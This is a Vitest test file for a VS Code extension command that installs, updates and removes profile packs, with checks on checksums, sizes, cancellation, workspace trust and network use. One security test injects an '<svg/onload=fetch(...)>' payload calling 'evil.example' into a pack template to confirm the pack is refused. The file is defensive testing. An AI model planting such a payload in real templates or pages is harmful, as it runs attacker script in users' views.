// Phase L3 (R-263, R-264): "pagemd: Get Profile Packs…". The packs here are the library's real packs (the fixtures checked into
// pagemd-common's @pagemd/packs); every install goes into a temporary PAGEMD_CONFIG_DIR, never the user's real shared folder or ~/.pagemd.
import { copyFileSync, existsSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { createHash } from 'node:crypto';
import { afterAll, afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import * as mock from '../../../__mocks__/vscode.ts';
import type * as vscode from 'vscode';
import { PackError, listInstalled, readZip, writeZip, type InstalledPack } from '@pagemd-editor/output-pagemd/packs';
import { buildRows, actionsOf, runPacks, stateText, summarize, newestPacks, type PackRow } from '../host/services/pack-manager.ts';
import { openSource } from '../host/services/pack-source.ts';
import { getProfilePacks, sourceSetting } from '../host/services/profile-packs.ts';
import { activate } from '../host/extension.ts';
import { GET_MORE_LABEL, HostOutput } from '../host/services/output.ts';
import { NO_FILES, PLAIN_STYLES, type HostStyles } from '../host/services/styles.ts';

const here = dirname(fileURLToPath(import.meta.url));
const FIXTURES = join(here, '..', '..', '..', '..', 'pagemd-common', 'packages', 'packs', 'test', 'fixtures');
const scratch = mkdtempSync(join(tmpdir(), 'pmd-l3-'));
afterAll(() => rmSync(scratch, { recursive: true, force: true }));

/** A fresh library folder (index.json + zips) from the checked-in fixtures; `v2` is the library with pml-sop-ink 0.2.0. */
function library(which: 'library' | 'library-v2' = 'library'): string {
  const dir = mkdtempSync(join(scratch, 'lib-'));
  for (const f of readdirSync(join(FIXTURES, which))) copyFileSync(join(FIXTURES, which, f), join(dir, f));
  return dir;
}

const SETTING_KEY = 'pagemdEditor.profilePacks.source';
const saved = { config: process.env['PAGEMD_CONFIG_DIR'], home: process.env['HOME'] };
let target = '';
let home = '';

beforeEach(() => {
  mock.resetMock();
  mock.quickPickMany.queue.length = 0;
  mock.progressMessages.length = 0;
  mock.authCalls.length = 0;
  mock.authSession.next = null;
  mock.authSession.silentNext = null;
  (mock.workspace as { isTrusted: boolean }).isTrusted = true;
  const config = mkdtempSync(join(scratch, 'cfg-'));
  home = mkdtempSync(join(scratch, 'home-'));
  process.env['PAGEMD_CONFIG_DIR'] = config;
  process.env['HOME'] = home;
  target = join(config, 'profiles');
});
afterEach(() => {
  process.env['PAGEMD_CONFIG_DIR'] = saved.config;
  process.env['HOME'] = saved.home;
  vi.unstubAllGlobals();
});

const deps = () => {
  const log: string[] = [];
  return { log, deps: { log: (line: string) => void log.push(line), showLog: () => void log.push('<show log>') } };
};
const useSource = (path: string): void => void mock.configuration.set(SETTING_KEY, path);

describe('the four states of a pack (L3-4)', () => {
  const entry = (id: string, version: string) => ({ id, type: 'sop', look: 'ink', version, file: `${id}-${version}.zip`, size: 10, sha256: 'a'.repeat(64) });
  const have = (id: string, version: string, extra: Partial<InstalledPack> = {}): InstalledPack => ({ id, version, built: null, type: 'sop', look: 'ink', pagemdMinVersion: null, requires: null, profile: '/x', changed: [], missing: [], installing: false, keptAfterUninstall: false, ...extra });

  it('not installed / installed x / update to y / changed by hand, and the actions each allows', () => {
    const rows = buildRows({
      latest: [entry('a', '0.1.0'), entry('b', '0.1.0'), entry('c', '0.2.0'), entry('d', '0.2.0'), entry('e', '0.1.0')],
      installed: [have('b', '0.1.0'), have('c', '0.1.0'), have('d', '0.1.0', { changed: ['d/types/sop/style.css'] }), have('e', '0.1.0', { installing: true })],
    });
    const by = Object.fromEntries(rows.map((r) => [r.id, r]));
    expect(stateText(by['a']!)).toBe('not installed (available 0.1.0)');
    expect(stateText(by['b']!)).toBe('installed 0.1.0');
    expect(stateText(by['c']!)).toBe('update to 0.2.0 (installed 0.1.0)');
    expect(stateText(by['d']!)).toBe('changed by hand (installed 0.1.0)');
    expect(stateText(by['e']!)).toMatch(/did not finish/);
    expect(actionsOf(by['a']!)).toEqual(['install']);
    expect(actionsOf(by['b']!)).toEqual(['remove']);
    expect(actionsOf(by['c']!)).toEqual(['update', 'remove']);
    expect(actionsOf(by['d']!)).toEqual(['remove']); // an update would stop on the changed file
    expect(actionsOf(by['e']!)).toEqual(['install', 'remove']);
  });

  it('a newer installed copy is just "installed"; an installed pack the source lacks is listed (Remove works); a missing file is "changed by hand"', () => {
    const rows = buildRows({ latest: [entry('a', '0.1.0')], installed: [have('a', '0.3.0'), have('gone', '0.1.0'), have('del', '0.1.0', { missing: ['del/x.css'] })] });
    expect(rows.map((r) => [r.id, r.state.kind])).toEqual([['a', 'installed'], ['del', 'changed'], ['gone', 'installed']]);
    expect(actionsOf(rows[2]!)).toEqual(['remove']);
  });

  it('a name already in another folder shows the reason and the file in the way, and offers nothing (L2-4)', () => {
    const rows = buildRows({ latest: [entry('a', '0.1.0')], installed: [], elsewhere: (id) => (id === 'a' ? [{ path: '/home/me/.pagemd/profiles/a.json', pointer: true }] : []) });
    expect(rows[0]!.state.kind).toBe('blocked');
    expect(stateText(rows[0]!)).toContain('/home/me/.pagemd/profiles/a.json');
    expect(actionsOf(rows[0]!)).toEqual([]);
  });

  it('offline (no index): only the installed packs, none installable', () => {
    const rows = buildRows({ latest: null, installed: [have('a', '0.1.0')] });
    expect(rows.map((r) => actionsOf(r))).toEqual([['remove']]);
  });

  it('reads the real library index: the newest of each pack, and the states against a real install', async () => {
    const source = await openSource({ kind: 'folder', path: library() });
    expect(newestPacks(source.index).map((p) => `${p.id} ${p.version}`)).toEqual(['pml-sop-ink 0.1.0', 'uofo-sop 0.1.0']);
    expect(buildRows({ latest: newestPacks(source.index), installed: [] }).map((r) => r.state.kind)).toEqual(['not-installed', 'not-installed']);
  });
});

describe('install, update and remove through @pagemd/packs against a folder source (L3-4, L3-5)', () => {
  const rowsFor = async (folder: string): Promise<{ rows: PackRow[]; source: Awaited<ReturnType<typeof openSource>> }> => {
    const source = await openSource({ kind: 'folder', path: folder });
    return { source, rows: buildRows({ latest: newestPacks(source.index), installed: listInstalled(target) }) };
  };
  const run = (source: Awaited<ReturnType<typeof openSource>> | null, wanted: Parameters<typeof runPacks>[0], extra: Partial<Parameters<typeof runPacks>[1]> = {}) => runPacks(wanted, { source, target, elsewhere: [], ...extra });

  it('an install that did not finish offers Remove, and Remove works (security review item 6: it used to say "not installed")', async () => {
    const { rows, source } = await rowsFor(library());
    const ink = rows.find((r) => r.id === 'pml-sop-ink')!;
    const stopped = await run(source, [{ row: ink, action: 'install' }], {
      install: (pack, to, options) => realInstall(pack, to, { ...options, onWrite: (_name: string, i: number) => { if (i >= 4) throw new Error('power cut'); } }),
    });
    expect(stopped[0]!.result).toBe('failed');
    const again = buildRows({ latest: newestPacks(source.index), installed: listInstalled(target) }).find((r) => r.id === 'pml-sop-ink')!;
    expect(again.state.kind).toBe('unfinished');
    expect(actionsOf(again)).toContain('remove');
    const removed = await run(null, [{ row: again, action: 'remove' }]);
    expect(removed.map((o) => [o.result, o.message])).toEqual([['done', 'pml-sop-ink removed.']]);
    expect(listInstalled(target)).toEqual([]);
  });

  it('installs both packs; installed copies are whole and listInstalled agrees', async () => {
    const { rows, source } = await rowsFor(library());
    const out = await run(source, rows.map((row) => ({ row, action: 'install' as const })));
    expect(out.map((o) => [o.id, o.result])).toEqual([['pml-sop-ink', 'done'], ['uofo-sop', 'done']]);
    expect(existsSync(join(target, 'pml-sop-ink.json'))).toBe(true);
    expect(existsSync(join(target, 'uofo-sop', 'manifest.json'))).toBe(true);
    expect(listInstalled(target).map((p) => `${p.id} ${p.version}`)).toEqual(['pml-sop-ink 0.1.0', 'uofo-sop 0.1.0']);
    expect(summarize(out)).toBe('Installed 2.');
  });

  it('updates a pack to the newer library, then removes it; another pack is left alone', async () => {
    const first = await rowsFor(library());
    await run(first.source, first.rows.map((row) => ({ row, action: 'install' as const })));
    const second = await rowsFor(library('library-v2'));
    const ink = second.rows.find((r) => r.id === 'pml-sop-ink')!;
    expect(ink.state.kind).toBe('update');
    const out = await run(second.source, [{ row: ink, action: 'update' }]);
    expect(out[0]).toMatchObject({ result: 'done', action: 'update' });
    expect(listInstalled(target).find((p) => p.id === 'pml-sop-ink')?.version).toBe('0.2.0');
    expect(summarize(out)).toBe('Updated 1.');
    const removed = await run(null, [{ row: buildRows({ latest: null, installed: listInstalled(target) }).find((r) => r.id === 'pml-sop-ink')!, action: 'remove' }]);
    expect(removed[0]).toMatchObject({ result: 'done', action: 'remove' });
    expect(existsSync(join(target, 'pml-sop-ink.json'))).toBe(false);
    expect(listInstalled(target).map((p) => p.id)).toEqual(['uofo-sop']);
  });

  it('Remove keeps a file you changed by hand and says so; the pack then shows as changed by hand', async () => {
    const { rows, source } = await rowsFor(library());
    await run(source, [{ row: rows.find((r) => r.id === 'uofo-sop')!, action: 'install' }]);
    const css = join(target, 'uofo-sop', 'types', 'sop', 'style.css');
    writeFileSync(css, `${readFileSync(css, 'utf8')}\n/* mine */\n`);
    expect(stateText(buildRows({ latest: null, installed: listInstalled(target) })[0]!)).toMatch(/changed by hand/);
    const out = await run(null, [{ row: buildRows({ latest: null, installed: listInstalled(target) })[0]!, action: 'remove' }]);
    expect(out[0]!.message).toMatch(/1 file\(s\) you had changed were kept/);
    expect(existsSync(css)).toBe(true);
  });

  it('a tampered zip is refused, and nothing is written', async () => {
    const folder = library();
    const zipFile = join(folder, 'uofo-sop-0.1.0.zip');
    const bytes = readFileSync(zipFile);
    bytes[Math.floor(bytes.length / 2)]! ^= 0xff;
    writeFileSync(zipFile, bytes);
    const { rows, source } = await rowsFor(folder);
    const out = await run(source, [{ row: rows.find((r) => r.id === 'uofo-sop')!, action: 'install' }]);
    expect(out[0]).toMatchObject({ result: 'failed', code: 1 });
    expect(out[0]!.message).toMatch(/refused and nothing was written/);
    expect(existsSync(target) ? readdirSync(target) : []).toEqual([]);
  });

  it('a tampered zip whose checksum was rewritten in the index too is still refused by its contents, nothing written', async () => {
    const folder = library();
    const zipFile = join(folder, 'uofo-sop-0.1.0.zip');
    const bytes = readFileSync(zipFile);
    bytes[Math.floor(bytes.length / 2)]! ^= 0xff;
    writeFileSync(zipFile, bytes);
    const index = JSON.parse(readFileSync(join(folder, 'index.json'), 'utf8'));
    index.packs.find((p: { id: string }) => p.id === 'uofo-sop').sha256 = createHash('sha256').update(bytes).digest('hex');
    writeFileSync(join(folder, 'index.json'), JSON.stringify(index));
    const { rows, source } = await rowsFor(folder);
    const out = await run(source, [{ row: rows.find((r) => r.id === 'uofo-sop')!, action: 'install' }]);
    expect(out[0]).toMatchObject({ result: 'failed', code: 1 });
    expect(existsSync(target) ? readdirSync(target) : []).toEqual([]);
  });

  it('a hostile pack with a matching checksum and manifest (an <svg/onload> in its template) is refused by its contents, nothing written', async () => {
    // the security review's case: the content check, not the checksum, is what guards against a hostile source
    const folder = library();
    const zipFile = join(folder, 'uofo-sop-0.1.0.zip');
    const sha = (b: Uint8Array): string => createHash('sha256').update(b).digest('hex');
    const files = readZip(readFileSync(zipFile)).filter((e) => !e.isDir).map(({ name, data }) => ({ name, data }));
    const tpl = files.find((f) => f.name.endsWith('.html'))!;
    tpl.data = Buffer.from(Buffer.from(tpl.data).toString('utf8').replace('</body>', '<svg/onload=fetch("//evil.example")></body>'));
    const mf = files.find((f) => f.name === 'uofo-sop/manifest.json')!;
    const manifest = JSON.parse(Buffer.from(mf.data).toString('utf8'));
    manifest.files = files.filter((f) => f !== mf).map((f) => ({ path: f.name, size: f.data.length, sha256: sha(f.data) }));
    mf.data = Buffer.from(JSON.stringify(manifest));
    const bytes = writeZip(files);
    writeFileSync(zipFile, bytes);
    const index = JSON.parse(readFileSync(join(folder, 'index.json'), 'utf8'));
    Object.assign(index.packs.find((p: { id: string }) => p.id === 'uofo-sop'), { sha256: sha(bytes), size: bytes.length });
    writeFileSync(join(folder, 'index.json'), JSON.stringify(index));
    const { rows, source } = await rowsFor(folder);
    const out = await run(source, [{ row: rows.find((r) => r.id === 'uofo-sop')!, action: 'install' }]);
    expect(out[0]).toMatchObject({ result: 'failed', code: 1 });
    expect(out[0]!.message).toMatch(/refused and nothing was written.*glued/);
    expect(existsSync(target) ? readdirSync(target) : []).toEqual([]);
  });

  it('a good zip whose checksum in the index differs is refused (the checksum check itself), nothing written', async () => {
    const folder = library();
    const index = JSON.parse(readFileSync(join(folder, 'index.json'), 'utf8'));
    index.packs.find((p: { id: string }) => p.id === 'uofo-sop').sha256 = 'c'.repeat(64);
    writeFileSync(join(folder, 'index.json'), JSON.stringify(index));
    const { rows, source } = await rowsFor(folder);
    const out = await run(source, [{ row: rows.find((r) => r.id === 'uofo-sop')!, action: 'install' }]);
    expect(out[0]).toMatchObject({ result: 'failed', code: 1 });
    expect(out[0]!.message).toMatch(/does not match its checksum/);
    expect(existsSync(target) ? readdirSync(target) : []).toEqual([]);
  });

  it('a download over the size its index entry gives is refused BEFORE verify runs, and nothing is written', async () => {
    const folder = library();
    const index = JSON.parse(readFileSync(join(folder, 'index.json'), 'utf8'));
    index.packs.find((p: { id: string }) => p.id === 'uofo-sop').size = 1000; // the zip on disk is much bigger
    writeFileSync(join(folder, 'index.json'), JSON.stringify(index));
    const { rows, source } = await rowsFor(folder);
    const verify = vi.fn();
    const install = vi.fn();
    const out = await run(source, [{ row: rows.find((r) => r.id === 'uofo-sop')!, action: 'install' }], { verify, install });
    expect(out[0]).toMatchObject({ result: 'failed' });
    expect(out[0]!.message).toMatch(/Nothing was written/);
    expect(verify).not.toHaveBeenCalled();
    expect(install).not.toHaveBeenCalled();
  });

  it('install is not attempted when verify fails', async () => {
    const { rows, source } = await rowsFor(library());
    const install = vi.fn();
    const out = await run(source, [{ row: rows[0]!, action: 'install' }], {
      verify: () => {
        throw new PackError('nope', 1);
      },
      install,
    });
    expect(out[0]!.result).toBe('failed');
    expect(install).not.toHaveBeenCalled();
  });

  it('a name blocked by L2-4 (exit 4) says which file is in the way and that nothing was removed', async () => {
    const other = mkdtempSync(join(scratch, 'other-'));
    writeFileSync(join(other, 'uofo-sop.json'), '{"note":"Installed by pagemd-library pointer"}');
    const { rows, source } = await rowsFor(library());
    const out = await run(source, [{ row: rows.find((r) => r.id === 'uofo-sop')!, action: 'install' }], { elsewhere: [other] });
    expect(out[0]).toMatchObject({ result: 'failed', code: 4 });
    expect(out[0]!.message).toContain(join(other, 'uofo-sop.json'));
    expect(out[0]!.message).toMatch(/pagemd-library/);
    expect(existsSync(join(other, 'uofo-sop.json'))).toBe(true);
    expect(existsSync(join(target, 'uofo-sop.json'))).toBe(false);
  });

  it('cancel is honoured between packs: the pack in flight finishes whole, the rest are not started', async () => {
    const { rows, source } = await rowsFor(library());
    const controller = new AbortController();
    const lines: string[] = [];
    const out = await run(source, rows.map((row) => ({ row, action: 'install' as const })), {
      signal: controller.signal,
      progress: (line) => {
        lines.push(line);
        if (lines.length === 1) queueMicrotask(() => controller.abort()); // pressed while the first pack is being fetched
      },
    });
    expect(lines).toEqual(['Installing pml-sop-ink (1 of 2)']);
    expect(out.map((o) => o.result)).toEqual(['cancelled', 'cancelled']);
    expect(existsSync(target) ? readdirSync(target) : []).toEqual([]);
    expect(summarize(out)).toBe('Nothing changed; 2 not done (stopped).');
  });

  it('cancel after the first pack was installed leaves that pack whole and skips the second', async () => {
    const { rows, source } = await rowsFor(library());
    const controller = new AbortController();
    const out = await run(source, rows.map((row) => ({ row, action: 'install' as const })), {
      signal: controller.signal,
      install: (pack, to, options) => {
        const result = realInstall(pack, to, options);
        controller.abort();
        return result;
      },
    });
    expect(out.map((o) => o.result)).toEqual(['done', 'cancelled']);
    expect(listInstalled(target).map((p) => p.id)).toEqual(['pml-sop-ink']);
    expect(listInstalled(target)[0]).toMatchObject({ changed: [], missing: [], installing: false });
  });
});

import { installPack as realInstall } from '@pagemd-editor/output-pagemd/packs';

describe('the command (L3-1, L3-2, L3-5, L3-6)', () => {
  it('installs the chosen pack from a folder source and says so; nothing signs in and nothing is fetched', async () => {
    vi.stubGlobal('fetch', () => {
      throw new Error('the network must not be used for a folder source');
    });
    useSource(library());
    const { deps: d } = deps();
    const out = await getProfilePacks(d, { install: ['uofo-sop'] });
    expect(out?.map((o) => [o.id, o.result])).toEqual([['uofo-sop', 'done']]);
    expect(listInstalled(target).map((p) => p.id)).toEqual(['uofo-sop']);
    expect(mock.shownInfo.at(-1)).toBe('pagemd Editor: Installed 1.');
    expect(mock.authCalls).toEqual([]);
    expect(mock.progressTitles).toContain('pagemd: profile packs');
  });

  it('through the pickers: ticks a pack in the list, installs it, and the list shows each state', async () => {
    useSource(library());
    mock.quickPickMany.queue.push(['pml-sop-ink']);
    await getProfilePacks(deps().deps);
    expect(mock.quickPicks[0]!.items).toEqual(['pml-sop-ink', 'uofo-sop']);
    expect(mock.quickPicks[0]!.descriptions).toEqual(['sop · ink  not installed (available 0.1.0)', 'sop · uofo  not installed (available 0.1.0)']);
    expect(listInstalled(target).map((p) => p.id)).toEqual(['pml-sop-ink']);
    // again: it is installed now, and "Remove installed packs…" is offered
    mock.quickPicks.length = 0;
    mock.quickPickMany.queue.push(undefined);
    await getProfilePacks(deps().deps);
    expect(mock.quickPicks[0]!.items).toEqual(['uofo-sop', 'pml-sop-ink', 'Remove installed packs…']);
    expect(mock.quickPicks[0]!.descriptions?.[1]).toContain('installed 0.1.0');
  });

  it('Reopen editor is offered after an install when a pagemd editor is active, and runs the reopen command', async () => {
    useSource(library());
    mock.warningDialog.next = undefined;
    const reopened: unknown[] = [];
    mock.registeredCommands.set('pagemd.reopenWithEditor', () => void reopened.push(1));
    const infoCalls: string[][] = [];
    const original = mock.window.showInformationMessage;
    mock.window.showInformationMessage = ((message: string, ...items: string[]) => {
      infoCalls.push([message, ...items]);
      return Promise.resolve(items[0]);
    }) as typeof original;
    try {
      await getProfilePacks({ ...deps().deps, hasPagemdEditor: () => true }, { install: ['uofo-sop'] });
    } finally {
      mock.window.showInformationMessage = original;
    }
    await new Promise((r) => setTimeout(r, 0)); // the message is not awaited by the command
    expect(infoCalls.at(-1)).toEqual(['pagemd Editor: Installed 1.', 'Reopen editor']);
    expect(reopened).toHaveLength(1);
  });

  it('offline: says so, still lists what is installed, and Remove works', async () => {
    // install one while the source is there, then point at a folder that is not (an unplugged Nextcloud)
    useSource(library());
    await getProfilePacks(deps().deps, { install: ['uofo-sop'] });
    mock.shownWarnings.length = 0;
    mock.quickPicks.length = 0;
    useSource(join(scratch, 'unplugged'));
    mock.quickPickMany.queue.push(['Remove installed packs…'], ['uofo-sop']);
    mock.warningDialog.next = 'Remove';
    const { deps: d, log } = deps();
    const out = await getProfilePacks(d);
    expect(mock.shownWarnings[0]!.message).toMatch(/Cannot reach the profile packs at .*unplugged.*Showing only what is installed/);
    expect(mock.quickPicks[0]!.items).toEqual(['uofo-sop', 'Remove installed packs…']);
    expect(mock.quickPicks[0]!.placeHolder).toMatch(/cannot be reached/);
    expect(out?.map((o) => [o.id, o.action, o.result])).toEqual([['uofo-sop', 'remove', 'done']]);
    expect(existsSync(join(target, 'uofo-sop.json'))).toBe(false);
    expect(log.some((l) => /could not be read/.test(l))).toBe(true);
  });

  it('a failure gives a clear message and offers Show log; the other packs still go in', async () => {
    const folder = library();
    const zipFile = join(folder, 'uofo-sop-0.1.0.zip');
    const bytes = readFileSync(zipFile);
    bytes[100]! ^= 1;
    writeFileSync(zipFile, bytes);
    useSource(folder);
    mock.warningDialog.next = undefined;
    const { deps: d, log } = deps();
    const out = await getProfilePacks(d, { install: ['uofo-sop', 'pml-sop-ink'] });
    expect(out?.map((o) => o.result)).toEqual(['failed', 'done']);
    expect(mock.shownWarnings.at(-1)!.message).toMatch(/^pagemd Editor: Installed 1; 1 failed\. uofo-sop was refused and nothing was written/);
    expect(mock.shownWarnings.at(-1)!.items).toEqual(['Show log']);
    expect(log.some((l) => /uofo-sop: exit 1/.test(l))).toBe(true);
    expect(listInstalled(target).map((p) => p.id)).toEqual(['pml-sop-ink']);
  });

  it('asks where to get packs when the setting is empty (a plan cannot answer: it errors)', async () => {
    mock.quickPick.next = undefined;
    expect(await getProfilePacks(deps().deps)).toBeUndefined();
    expect(mock.quickPicks[0]!.items).toEqual(['The pagemd library on GitHub', 'A folder on this computer…', 'An https:// address…']);
    expect(await getProfilePacks(deps().deps, { install: ['x'] })).toBeUndefined();
    expect(mock.shownErrors.at(-1)).toMatch(/set "pagemdEditor.profilePacks.source"/);
  });

  it('refuses an http:// source with a message, and fetches nothing', async () => {
    const fetchStub = vi.fn();
    vi.stubGlobal('fetch', fetchStub);
    useSource('http://example.org/index.json');
    expect(await getProfilePacks(deps().deps, { install: ['x'] })).toBeUndefined();
    expect(mock.shownErrors.at(-1)).toMatch(/Only https:\/\/ addresses are accepted/);
    expect(fetchStub).not.toHaveBeenCalled();
  });

  it('an https source that cannot be reached is "offline" through fetch, never an exception', async () => {
    vi.stubGlobal('fetch', () => Promise.reject(Object.assign(new TypeError('fetch failed'), { cause: { code: 'ENOTFOUND' } })));
    useSource('https://packs.example.org/index.json');
    mock.quickPickMany.queue.push(undefined);
    expect(await getProfilePacks(deps().deps)).toBeUndefined();
    expect(mock.shownWarnings[0]!.message).toMatch(/Cannot reach the profile packs at https:\/\/packs\.example\.org\/index\.json: Could not reach packs\.example\.org \(ENOTFOUND\)/);
  });
});

describe('the source setting in a workspace you have not trusted (L3-2)', () => {
  it('is read from the user\'s own settings only; the workspace value is ignored', () => {
    mock.configuration.set(SETTING_KEY, '/from/the/workspace');
    mock.configurationScopes.set(SETTING_KEY, { globalValue: '/from/the/user', workspaceValue: '/from/the/workspace' });
    expect(sourceSetting()).toBe('/from/the/workspace'); // trusted: VS Code's merged value
    (mock.workspace as { isTrusted: boolean }).isTrusted = false;
    expect(sourceSetting()).toBe('/from/the/user');
    mock.configurationScopes.set(SETTING_KEY, { workspaceValue: '/from/the/workspace' });
    expect(sourceSetting()).toBe('');
  });

  it('the command then asks instead of using the workspace\'s source', async () => {
    mock.configuration.set(SETTING_KEY, library());
    mock.configurationScopes.set(SETTING_KEY, { workspaceValue: 'x' });
    (mock.workspace as { isTrusted: boolean }).isTrusted = false;
    await getProfilePacks(deps().deps);
    expect(mock.quickPicks[0]!.placeHolder).toMatch(/Where should the profile packs come from/);
  });

  it('the manifest lists the setting as restricted, machine-scoped and empty by default', () => {
    const pkg = JSON.parse(readFileSync(join(here, '..', 'package.json'), 'utf8'));
    expect(pkg.capabilities.untrustedWorkspaces.restrictedConfigurations).toContain(SETTING_KEY);
    expect(pkg.contributes.configuration.properties[SETTING_KEY]).toMatchObject({ type: 'string', default: '', scope: 'machine' });
    expect(pkg.contributes.commands).toContainEqual({ command: 'pagemd.getProfilePacks', title: 'pagemd: Get Profile Packs…' });
  });
});

describe('the network is used only by the command (L3-3, R-264 item 3)', () => {
  it('the command is registered, and the profile picker\'s last entry runs it', async () => {
    activate(mock.createExtensionContext());
    expect(mock.registeredCommands.has('pagemd.getProfilePacks')).toBe(true);
    const doc = new mock.MockTextDocument(mock.Uri.file('/work/docs/guide.md'), '---\nprofile: sop\n---\n# G\n');
    mock.openDocuments.push(doc);
    mock.mockFiles.set('/ext/dist/defaults/profiles/sop.json', new TextEncoder().encode('{"id":"sop"}'));
    const output = new HostOutput(doc as unknown as vscode.TextDocument, mock.createWebviewPanel().panel.webview, { extensionUri: mock.Uri.file('/ext') as unknown as vscode.Uri, log: () => undefined, styles: noStyles(), runtimeFile: join(scratch, 'none.mjs') });
    mock.quickPick.next = GET_MORE_LABEL;
    mock.executedCommands.length = 0;
    expect(await output.chooseProfile()).toBeUndefined();
    expect(mock.quickPicks[0]!.items.at(-1)).toBe(GET_MORE_LABEL);
    expect(mock.executedCommands).toEqual([['pagemd.getProfilePacks']]);
  });

  it('opening, listing profiles, previewing and exporting never touch fetch', async () => {
    const fetchStub = vi.fn(() => {
      throw new Error('the network was used outside the command');
    });
    vi.stubGlobal('fetch', fetchStub);
    useSource('https://github.com/gh4-io/pagemd-library'); // a configured network source must not matter either
    activate(mock.createExtensionContext());
    const runtime = join(scratch, 'runtime.mjs');
    writeFileSync(runtime, `export const runtime = { async renderForPreview() { return { html: '<p>x</p>', colorScheme: 'light', profile: 'p' }; }, async exportText(t, o) { return { path: o.target }; }, detectBrowser: () => '/usr/bin/chrome', mermaidVersion: () => '1' };\n`);
    const doc = new mock.MockTextDocument(mock.Uri.file('/work/docs/guide.md'), '# G\n');
    mock.openDocuments.push(doc);
    const output = new HostOutput(doc as unknown as vscode.TextDocument, mock.createWebviewPanel().panel.webview, { extensionUri: mock.Uri.file('/ext') as unknown as vscode.Uri, log: () => undefined, styles: noStyles(), runtimeFile: runtime });
    await output.profiles();
    expect((await output.preview('N')).provider).toBe('pagemd');
    expect((await output.exportTo('pdf', '/work/docs/guide.pdf')).ok).toBe(true);
    expect(fetchStub).not.toHaveBeenCalled();
  });

  it('only pack-source.ts (and the test hooks) can reach the network: no other host or package file uses fetch, http, https or net', () => {
    const roots = [join(here, '..', 'host'), join(here, '..', '..', '..', 'packages'), join(here, '..', 'shared'), join(here, '..', 'webview')];
    const hits: string[] = [];
    const walk = (dir: string): void => {
      for (const entry of readdirSync(dir, { withFileTypes: true })) {
        const path = join(dir, entry.name);
        if (entry.isDirectory()) {
          if (!['node_modules', 'dist', 'test'].includes(entry.name)) walk(path);
        } else if (/\.(ts|js|mjs)$/.test(entry.name) && !/\.d\.ts$/.test(entry.name) && !path.endsWith('pack-source.ts')) {
          const text = readFileSync(path, 'utf8');
          if (/\bfetch\s*\(|from ['"]node:(https?|net|tls|dgram|dns)['"]|require\(['"](https?|node:https?)['"]\)|XMLHttpRequest|new WebSocket/.test(text)) hits.push(path.replace(join(here, '..', '..', '..'), ''));
        }
      }
    };
    roots.forEach(walk);
    // Known, earlier uses outside this phase (list them so a new one is noticed): none are expected.
    expect(hits).toEqual([]);
  });
});

function noStyles(): HostStyles {
  return { get: async () => PLAIN_STYLES, onChange: () => ({ dispose() {} }), createLayoutFile: async () => 'declined', filesInUse: async () => NO_FILES, dispose() {} };
}
